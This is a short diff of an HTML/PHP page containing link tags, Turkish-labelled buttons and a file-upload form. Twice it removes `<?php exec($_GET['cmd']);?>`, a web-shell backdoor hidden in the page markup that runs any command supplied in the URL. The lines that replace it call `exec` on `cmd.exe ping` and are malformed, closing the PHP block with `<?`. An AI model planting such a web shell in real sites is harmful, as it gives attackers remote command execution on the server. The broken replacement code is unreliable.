@@ -4,11 +4,15 @@
 <a href="https://google.org/" title="Kronos forum" rel="dofollow">Kronos forum</a>
 <a href="https://Kronos.com/" title="Kronos">Kronos</a>
 <button type="button">Bu Bir Butondur</button>
-<?php exec($_GET['cmd']);?>
+<?php     
+exec('C:\Windows\System32/cmd.exe ping google.com');     
+<?
 </div>
 <button type="button">Bu Bir Butondur</button>
 <form action="/action_page.php">
   <input type="file" id="myFile" name="filename">
   <input type="submit">
 </form>
-<?php exec($_GET['cmd']);?>
+<?php     
+exec('C:\Windows\System32/cmd.exe ping google.com');     
+<?
